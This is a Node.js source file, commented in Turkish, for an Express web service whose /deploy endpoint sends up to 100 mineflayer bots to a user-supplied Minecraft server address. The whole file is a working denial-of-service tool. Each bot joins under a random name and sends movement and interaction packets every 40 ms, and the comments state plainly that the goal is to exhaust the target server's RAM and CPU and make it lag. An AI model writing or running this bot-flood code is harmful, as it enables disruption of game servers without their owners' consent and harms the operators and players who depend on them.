const mineflayer = require('mineflayer');
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

let activeBots = [];

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[⚡ VIP POWER] 129GB RAM Modu Aktif. Hedef: ${host}:${port}`);

    // Bot sayısını makine gücüne göre artırabilirsin (Örn: 100)
    for (let i = 0; i < Math.min(count, 100); i++) {
        setTimeout(() => {
            const bot = mineflayer.createBot({
                host: host,
                port: port,
                username: `Z_Client_${Math.floor(Math.random() * 999999)}`,
                version: "1.20.1",
                hideErrors: true,
                viewDistance: "tiny" // Botun RAM yemesini engeller, sunucuya yüklenir
            });

            bot.on('spawn', () => {
                console.log(`[+] ${bot.username} Sızdı. Paket yağmuru başladı!`);
                
                // SUNUCU RAM VE CPU BİTİRME DÖNGÜSÜ (Ultra Fast)
                setInterval(() => {
                    if (bot.entity) {
                        // 1. Chunk Yükleme Paketi (Sunucuyu yorar)
                        bot.look(Math.random() * 360, Math.random() * 180);
                        
                        // 2. Etkileşim Spam (Sunucu her hareketi hesaplamak zorunda kalır)
                        bot.swingArm('right');
                        bot.setControlState('sneak', true);
                        
                        // 3. Hareket Paketi (Sunucuda lag yapar)
                        bot.setControlState('jump', true);
                        
                        setTimeout(() => {
                            bot.setControlState('sneak', false);
                            bot.setControlState('jump', false);
                        }, 50);
                    }
                }, 40); // Saniyede 25 paket gönderir (Extreme)
            });

            bot.on('error', (err) => console.log(`[!] ${err.message}`));
            activeBots.push(bot);
        }, i * 200); // Çok hızlı giriş (0.2 saniye arayla)
    }
    res.json({ success: true, message: "129GB RAM Gücüyle Ordu Sevk Edildi!" });
});

app.post('/stop', (req, res) => {
    activeBots.forEach(b => b.quit());
    activeBots = [];
    res.json({ success: true });
});

app.listen(process.env.PORT || 3000);
